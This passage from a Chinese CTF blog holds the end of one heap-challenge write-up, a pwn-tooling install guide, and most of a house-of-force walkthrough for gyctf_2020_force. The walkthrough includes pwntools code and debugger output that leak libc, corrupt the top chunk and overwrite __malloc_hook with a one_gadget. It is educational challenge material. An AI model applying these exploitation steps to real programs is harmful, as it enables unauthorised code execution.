<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x6020a0-8</span><br><span class="line">0x602098:	0x0000000000000000	0x0000000000000060</span><br><span class="line">0x6020a8:	0x6e69777b67610a61	0x696378655f726574</span><br><span class="line">0x6020b8:	0x000000007d646574	0x0000000000000000</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30s 0x6020a0-8</span><br><span class="line">0x602098:	&quot;&quot;</span><br><span class="line">0x602099:	&quot;&quot;</span><br><span class="line">0x60209a:	&quot;&quot;</span><br><span class="line">0x60209b:	&quot;&quot;</span><br><span class="line">0x60209c:	&quot;&quot;</span><br><span class="line">0x60209d:	&quot;&quot;</span><br><span class="line">0x60209e:	&quot;&quot;</span><br><span class="line">0x60209f:	&quot;&quot;</span><br><span class="line">0x6020a0:	&quot;&#96;&quot;</span><br><span class="line">0x6020a2:	&quot;&quot;</span><br><span class="line">0x6020a3:	&quot;&quot;</span><br><span class="line">0x6020a4:	&quot;&quot;</span><br><span class="line">0x6020a5:	&quot;&quot;</span><br><span class="line">0x6020a6:	&quot;&quot;</span><br><span class="line">0x6020a7:	&quot;&quot;</span><br><span class="line">0x6020a8:	&quot;a\nag&#123;winter_excited&#125;&quot;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x50</span>,p64(fake_chunk),<span class="number">0x50</span>,p64(fake_chunk))<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x50</span>,<span class="string">'a'</span>,<span class="number">0x70</span>,<span class="string">'a'</span>)<span class="comment">#2</span></span><br></pre></td></tr></table></figure>
<h4 id="5-打印4"><a href="#5-打印4" class="headerlink" title="5.打印4"></a>5.打印4</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0xac bytes:</span><br><span class="line">    &quot;# Banana&#39;s ba is a\n&quot;</span><br><span class="line">    &#39;ag&#123;winter_excited&#125;\n&#39;</span><br><span class="line">    &quot;# Banana&#39;s na is a\n&quot;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">view(4)</span><br><span class="line">p.recv()</span><br></pre></td></tr></table></figure>
<p>以前写的：<a href="https://blog.csdn.net/qq_43935969/article/details/104756082?spm=1001.2014.3001.5501" target="_blank" rel="noopener">i春秋新春战役PWN之Some_thing_exceting</a></p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="gyctf_2020_some_thing_exceting">文件</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/04/30/16-30/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/shuwen.jpg">
      <meta itemprop="name" content="Shuwen">
      <meta itemprop="description" content="做有意思的事，有意思地做事">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Shuwen's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/04/30/16-30/" class="post-title-link" itemprop="url">软件安装</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-04-30 16:30:31" itemprop="dateCreated datePublished" datetime="2021-04-30T16:30:31+08:00">2021-04-30</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-08-08 00:48:56" itemprop="dateModified" datetime="2021-08-08T00:48:56+08:00">2021-08-08</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%B8%B8%E7%94%A8%E8%BD%AF%E4%BB%B6/" itemprop="url" rel="index"><span itemprop="name">常用软件</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="1-sublime"><a href="#1-sublime" class="headerlink" title="1.sublime"></a>1.sublime</h2><blockquote>
<p>ubuntu下比较好用的编辑器</p>
<p><a href="http://www.sublimetext.com/docs/3/linux_repositories.html" target="_blank" rel="noopener">官网</a></p>
<p>使用的系统：ubuntu 16.04</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ wget -qO - https:&#x2F;&#x2F;download.sublimetext.com&#x2F;sublimehq-pub.gpg | sudo apt-key add -</span><br><span class="line">$ sudo apt-get install apt-transport-https</span><br><span class="line">$ echo &quot;deb https:&#x2F;&#x2F;download.sublimetext.com&#x2F; apt&#x2F;stable&#x2F;&quot; | sudo tee &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;sublime-text.list</span><br><span class="line">$ sudo apt-get update</span><br><span class="line">$ sudo apt-get install sublime-text</span><br></pre></td></tr></table></figure>
<h2 id="2-pwn-debug"><a href="#2-pwn-debug" class="headerlink" title="2.pwn_debug"></a>2.pwn_debug</h2><blockquote>
<p>用来解决libc版本加载问题，，，</p>
<p><a href="https://github.com/ray-cp/pwn_debug/wiki" target="_blank" rel="noopener">官网</a></p>
</blockquote>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;ray-cp&#x2F;pwn_debug.git</span><br><span class="line">cd pwn_debug</span><br><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure>
<h4 id="安装使用的libc"><a href="#安装使用的libc" class="headerlink" title="安装使用的libc"></a>安装使用的libc</h4><p>指定版本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># .&#x2F;build.sh $(version)</span><br><span class="line">.&#x2F;build.sh 2.23</span><br></pre></td></tr></table></figure>
<h2 id="3-gef"><a href="#3-gef" class="headerlink" title="3.gef"></a>3.gef</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget -q -O ~&#x2F;.gdbinit-gef.py https:&#x2F;&#x2F;github.com&#x2F;hugsy&#x2F;gef&#x2F;raw&#x2F;master&#x2F;gef.py</span><br><span class="line">echo source ~&#x2F;.gdbinit-gef.py &gt;&gt; ~&#x2F;.gdbinit</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source &#x2F;home&#x2F;winter&#x2F;.gdbinit-gef.py</span><br></pre></td></tr></table></figure>
<h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><ol>
<li><code>dereference</code></li>
<li>fmtarg</li>
</ol>
<h2 id="4-Pwngdb"><a href="#4-Pwngdb" class="headerlink" title="4.Pwngdb"></a>4.Pwngdb</h2><blockquote>
<p>为了fmtarg</p>
<p><a href="https://github.com/scwuaptx/Pwngdb" target="_blank" rel="noopener">官网</a></p>
</blockquote>
<h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~&#x2F;</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;scwuaptx&#x2F;Pwngdb.git </span><br><span class="line">cp ~&#x2F;Pwngdb&#x2F;.gdbinit ~&#x2F;</span><br></pre></td></tr></table></figure>
<h3 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ fmtarg 0x7fffffffde50</span><br><span class="line">The index of format argument : 8 (&quot;\%7$p&quot;)	#看括号里面的</span><br></pre></td></tr></table></figure>
<h2 id="5-one-gadget"><a href="#5-one-gadget" class="headerlink" title="5.one_gadget"></a>5.one_gadget</h2><h3 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.安装rupy,具体见下面的注意</span><br><span class="line">sudo gem install one_gadget</span><br></pre></td></tr></table></figure>
<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>one_gadget要求较高得ruby版本，直接使用源里的太旧</p>
<p>解决方法：卸载掉本地的ruby、去官网添加最新版源</p>
<h2 id="6-ruby"><a href="#6-ruby" class="headerlink" title="6.ruby"></a>6.ruby</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#卸载ruby</span></span><br><span class="line">$ sudo apt-get remove ruby</span><br><span class="line"><span class="comment">#https://www.ruby-lang.org/en/downloads/ 下载安装包</span></span><br><span class="line"><span class="comment">#解压，安装</span></span><br><span class="line">$ $ ./configure</span><br><span class="line">$ make</span><br><span class="line">$ sudo make install</span><br><span class="line"><span class="comment">#安装one_gadget</span></span><br><span class="line">$ sudo gem install one_gadget</span><br></pre></td></tr></table></figure>
<h2 id="7-pwntools"><a href="#7-pwntools" class="headerlink" title="7.pwntools"></a>7.pwntools</h2><p>ubuntu20.04：<a href="https://blog.csdn.net/Evaristexu/article/details/108025981" target="_blank" rel="noopener">https://blog.csdn.net/Evaristexu/article/details/108025981</a></p>
<p>其他ubuntu版本：<a href="https://www.cnblogs.com/pcat/p/5451780.html" target="_blank" rel="noopener">https://www.cnblogs.com/pcat/p/5451780.html</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pwntools -i https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple&#x2F;</span><br></pre></td></tr></table></figure>
<h2 id="8-xfce4"><a href="#8-xfce4" class="headerlink" title="8.xfce4"></a>8.xfce4</h2><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><blockquote>
<p> 修改teminal背景</p>
</blockquote>
<h3 id="安装-3"><a href="#安装-3" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install xfce4-terminal</span><br><span class="line">xfce4终端</span><br></pre></td></tr></table></figure>
<h2 id="9-seccomp-tools"><a href="#9-seccomp-tools" class="headerlink" title="9.seccomp-tools"></a>9.seccomp-tools</h2><blockquote>
<p><a href="https://github.com/david942j/seccomp-tools" target="_blank" rel="noopener">官网</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc ruby-dev</span><br><span class="line">sudo gem install seccomp-tools</span><br></pre></td></tr></table></figure>
<h2 id="10-LibcSearcher"><a href="#10-LibcSearcher" class="headerlink" title="10.LibcSearcher"></a>10.LibcSearcher</h2><p>github：<a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">https://github.com/lieanu/LibcSearcher</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;lieanu&#x2F;LibcSearcher.git</span><br><span class="line">cd LibcSearcher</span><br><span class="line">(sudo) python setup.py develop</span><br></pre></td></tr></table></figure>
<h2 id="11-pwn环境可视化"><a href="#11-pwn环境可视化" class="headerlink" title="11.pwn环境可视化"></a>11.pwn环境可视化</h2><ol>
<li><a href="https://bbs.pediy.com/thread-257344.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-257344.htm</a></li>
<li><a href="https://github.com/bet4it/build-an-efficient-pwn-environment" target="_blank" rel="noopener">https://github.com/bet4it/build-an-efficient-pwn-environment</a></li>
</ol>
<h2 id="12-pip"><a href="#12-pip" class="headerlink" title="12.pip"></a>12.pip</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python-pip</span><br></pre></td></tr></table></figure>
<h2 id="13-pwndbg"><a href="#13-pwndbg" class="headerlink" title="13.pwndbg"></a>13.pwndbg</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;pwndbg&#x2F;pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">.&#x2F;setup.sh</span><br></pre></td></tr></table></figure>
<h2 id><a href="#" class="headerlink" title=" "></a> </h2>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/04/27/23-47/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/shuwen.jpg">
      <meta itemprop="name" content="Shuwen">
      <meta itemprop="description" content="做有意思的事，有意思地做事">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Shuwen's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/04/27/23-47/" class="post-title-link" itemprop="url">gyctf_2020_force</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-04-27 23:47:06 / 修改时间：23:55:44" itemprop="dateCreated datePublished" datetime="2021-04-27T23:47:06+08:00">2021-04-27</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/buu/" itemprop="url" rel="index"><span itemprop="name">buu</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote>
<p><del>搞得我想吐，，，总是出现奇奇怪怪的问题，sendline和send为什么返回的地址不一样，，，</del></p>
<p>没想到居然是去年高校战役的题，好吧，当时还做了下这个比赛，不过没弄这道题，发现还是一个比较常规的题，house of force</p>
</blockquote>
<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><p>堆体，，，只有一个功能（puts函数没有用）</p>
<p><img src="/2021/04/27/23-47/image-20210427211531288.png" alt="image-20210427211531288"></p>
<p>对于add</p>
<blockquote>
<p>分配任意大小的chunk，但是固定读入数据0x50大小，所以如果申请的大小小于0x50，就存在堆溢出</p>
</blockquote>
<p><img src="/2021/04/27/23-47/image-20210427211635840.png" alt="image-20210427211635840"></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>由于题目是保护全开，所以不能覆盖got表</p>
<p>方法：</p>
<ol>
<li>分配超过mmap阈值的堆块 =&gt; 经过mmap分配的地址，与libc有固定偏移 =&gt; 泄露libc地址</li>
<li>正常分配堆块 =&gt; 泄露堆地址</li>
<li>覆写top chunk‘size为0xffffffffffffffff，就可以将top chunk指针抬高</li>
<li>使top chunk落在<code>__malloc_hook</code>附近，修改<code>__malloc_hook</code>和<code>__realloc_hook</code><ul>
<li><code>__malloc_hook</code> =&gt; __realloc_hook + 0x10（为了满足one_gadget的限制） </li>
<li><code>__realloc_hook</code> =&gt; one_gadget</li>
</ul>
</li>
<li>malloc一下 =&gt; getshell</li>
</ol>
<h3 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h3><h4 id="0-基本信息"><a href="#0-基本信息" class="headerlink" title="0.基本信息"></a>0.基本信息</h4><blockquote>
<p>保护全开，故考虑覆盖__malloc_hook</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;buu$ file gyctf_2020_force </span><br><span class="line">gyctf_2020_force: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, for GNU&#x2F;Linux 2.6.32, BuildID[sha1]&#x3D;6d464fea7805860b83ff9bc8f4467dd258ebd04f, stripped</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;buu$ checksec gyctf_2020_force </span><br><span class="line">[*] &#39;&#x2F;home&#x2F;winter&#x2F;buu&#x2F;gyctf_2020_force&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<h4 id="1-分配大块"><a href="#1-分配大块" class="headerlink" title="1.分配大块"></a>1.分配大块</h4><blockquote>
<p>分配一个0x200000的超大块，启用mmap分配，与libc的偏移固定，并计算得到libc_base</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x20 bytes:</span><br><span class="line">    &#39;bin addr 0x7ff0e84e4010\n&#39;</span><br><span class="line">    &#39;content\n&#39;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x7ff0e84e4000</span><br><span class="line">0x7ff0e84e4000:	0x0000000000000000	0x0000000000201002</span><br><span class="line">0x7ff0e84e4010:	0x000a7265746e6977	0x0000000000000000</span><br><span class="line">0x7ff0e84e4020:	0x0000000000000000	0x0000000000000000</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;5s 0x7ff0e84e4010</span><br><span class="line">0x7ff0e84e4010:	&quot;winter\n&quot;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x559a9f799000     0x559a9f79a000 r-xp     1000 0      &#x2F;home&#x2F;winter&#x2F;buu&#x2F;gyctf_2020_force</span><br><span class="line">    0x559a9f99a000     0x559a9f99b000 r--p     1000 1000   &#x2F;home&#x2F;winter&#x2F;buu&#x2F;gyctf_2020_force</span><br><span class="line">    0x559a9f99b000     0x559a9f99c000 rw-p     1000 2000   &#x2F;home&#x2F;winter&#x2F;buu&#x2F;gyctf_2020_force</span><br><span class="line">    0x7ff0e84e4000     0x7ff0e86e5000 rw-p   201000 0      </span><br><span class="line">    0x7ff0e86e5000     0x7ff0e88a5000 r-xp   1c0000 0      &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">    0x7ff0e88a5000     0x7ff0e8aa5000 ---p   200000 1c0000 &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">    0x7ff0e8aa5000     0x7ff0e8aa9000 r--p     4000 1c0000 &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">    0x7ff0e8aa9000     0x7ff0e8aab000 rw-p     2000 1c4000 &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">    0x7ff0e8aab000     0x7ff0e8aaf000 rw-p     4000 0      </span><br><span class="line">    0x7ff0e8aaf000     0x7ff0e8ad5000 r-xp    26000 0      &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.23.so</span><br><span class="line">    0x7ff0e8cb8000     0x7ff0e8cbb000 rw-p     3000 0      </span><br><span class="line">    0x7ff0e8cd4000     0x7ff0e8cd5000 r--p     1000 25000  &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.23.so</span><br><span class="line">    0x7ff0e8cd5000     0x7ff0e8cd6000 rw-p     1000 26000  &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.23.so</span><br><span class="line">    0x7ff0e8cd6000     0x7ff0e8cd7000 rw-p     1000 0      </span><br><span class="line">    0x7fffae287000     0x7fffae2a8000 rw-p    21000 0      [stack]</span><br><span class="line">    0x7fffae2c0000     0x7fffae2c3000 r--p     3000 0      [vvar]</span><br><span class="line">    0x7fffae2c3000     0x7fffae2c5000 r-xp     2000 0      [vdso]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[+] libc_base:0x7ff0e86e5000</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bin_addr  = add(<span class="number">0x200000</span>,<span class="string">'winter'</span>)</span><br><span class="line"><span class="comment">#0x7f52f5a7d000 - 0x7f52f587c010 = 0x200FF0</span></span><br><span class="line">libc_base = <span class="number">0x200FF0</span> + bin_addr</span><br><span class="line">log.success(<span class="string">"libc_base:"</span>+hex(libc_base))</span><br></pre></td></tr></table></figure>
<h4 id="2-正常分配"><a href="#2-正常分配" class="headerlink" title="2.正常分配"></a>2.正常分配</h4><blockquote>
<p>正常分配，得到的地址，是heap的基地址，因为申请0x18的大小，故top chunk就在heap_base+0x10</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x20 bytes:</span><br><span class="line">    &#39;bin addr 0x559aa0cf3010\n&#39;</span><br><span class="line">    &#39;content\n&#39;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x559aa0cf3000</span><br><span class="line">0x559aa0cf3000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x559aa0cf3010:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x559aa0cf3020:	0x0000000000000000	0xffffffffffffffff</span><br><span class="line">0x559aa0cf3030:	0x000000000000000a	0x0000000000000000</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[+] heap_base:0x559aa0cf3010</span><br><span class="line">[+] top_chunk:0x559aa0cf3020</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x10</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">heap_base = add(<span class="number">0x18</span>,payload)</span><br><span class="line">log.success(<span class="string">"heap_base:"</span>+hex(heap_base))</span><br><span class="line">top_chunk = heap_base + <span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">"top_chunk:"</span>+hex(top_chunk))</span><br></pre></td></tr></table></figure>
<h4 id="3-分配到malloc附近"><a href="#3-分配到malloc附近" class="headerlink" title="3.分配到malloc附近"></a>3.分配到malloc附近</h4><blockquote>
<p><code>__malloc_hook</code>-0x33附近有\x7f，故分配到这里</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x559aa0cf3000</span><br><span class="line">0x559aa0cf3000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x559aa0cf3010:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x559aa0cf3020:	0x0000000000000000	0x00002a5647db6ad1</span><br><span class="line">0x559aa0cf3030:	0x0000000a61616161	0x0000000000000000</span><br><span class="line">0x559aa0cf3040:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">target = malloc_hook - top_chunk - <span class="number">0x33</span></span><br><span class="line"></span><br><span class="line">add(target,<span class="string">'aaaa'</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x7ff0e8aa9b20 - 0x33 - 5</span><br><span class="line">0x7ff0e8aa9ae8 &lt;_IO_wide_data_0+296&gt;:	0x0000000000000000	0x00007ff0e8aa8260</span><br><span class="line">0x7ff0e8aa9af8:	0xffffd5a9b8249529	0x00007ff0e876aea0</span><br><span class="line">0x7ff0e8aa9b08 &lt;__realloc_hook&gt;:	0x00007ff0e876aa70	0x0000000000000000</span><br><span class="line">0x7ff0e8aa9b18:	0x0000000000000000	0x0000000100000000</span><br></pre></td></tr></table></figure>
<h4 id="4-覆写-malloc-hook"><a href="#4-覆写-malloc-hook" class="headerlink" title="4.覆写__malloc_hook"></a>4.覆写__malloc_hook</h4><blockquote>
<p>用gadget覆写malloc_hook，为了调节栈帧（<a href="https://bbs.pediy.com/thread-246786.htm" target="_blank" rel="noopener">参考博客</a>），还覆写realloc_hook。</p>
<ul>
<li>realloc_hook =&gt; one_gadget</li>
<li>malloc_hook =&gt; realloc_hook + 0x10</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x7ff0e8aa9b0d - 5</span><br><span class="line">0x7ff0e8aa9b08 &lt;__realloc_hook&gt;:	0x00007ff0e872a27a	0x00007ff0e8769720</span><br></pre></td></tr></table></figure>
